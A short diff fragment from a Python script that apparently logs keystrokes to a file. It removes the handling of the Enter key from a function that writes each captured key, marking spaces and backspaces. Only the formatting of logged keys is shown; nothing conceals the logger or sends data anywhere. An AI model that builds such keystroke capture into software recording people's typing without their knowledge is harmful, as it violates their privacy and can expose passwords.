@@ -47,9 +47,6 @@ def write_file(keys):
             if key == Key.space:
                 f.write(" ")
 
-            elif key == Key.enter:
-                f.write("'\n'")
-
             elif key == Key.backspace:
                 f.write("[BACKSPACE]")
 
